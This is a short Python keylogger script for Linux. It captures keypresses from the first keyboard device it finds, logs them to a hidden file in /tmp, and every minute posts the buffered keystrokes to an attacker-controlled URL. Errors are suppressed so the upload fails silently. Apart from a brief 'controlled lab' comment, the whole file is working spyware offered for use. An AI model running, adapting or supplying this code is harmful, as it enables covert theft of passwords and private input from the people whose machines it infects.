#!/usr/bin/env python3
import evdev
import time
import threading
import requests  # for exfil (use only in controlled lab)

# Configuration - CHANGE THESE
LOG_FILE = "/tmp/.keylog.txt"
EXFIL_URL = "http://attackeripaddr:8080/exfil"  # Your controlled receiver
INTERVAL = 60  # seconds between exfil

buffer = []
lock = threading.Lock()

def exfil_data():
    global buffer
    while True:
        time.sleep(INTERVAL)
        with lock:
            if buffer:
                try:
                    data = "".join(buffer)
                    requests.post(EXFIL_URL, json={"keys": data, "host": "test-host"}, timeout=5)
                    buffer.clear()
                except:
                    pass  # Fail silently in real use

# Start exfil thread
threading.Thread(target=exfil_data, daemon=True).start()

def main():
    # Find keyboard devices
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    keyboards = [dev for dev in devices if "keyboard" in dev.name.lower() or "kbd" in dev.name.lower()]
    
    if not keyboards:
        print("No keyboard found")
        return
    
    dev = keyboards[0]  # Take first keyboard
    print(f"Logging from: {dev.name} ({dev.path})")
    
    try:
        for event in dev.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                key_event = evdev.categorize(event)
                if event.value == 1:  # Key down
                    key = key_event.keycode
                    with lock:
                        buffer.append(f"[{key}]")
                    with open(LOG_FILE, "a") as f:
                        f.write(f"{key}\n")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()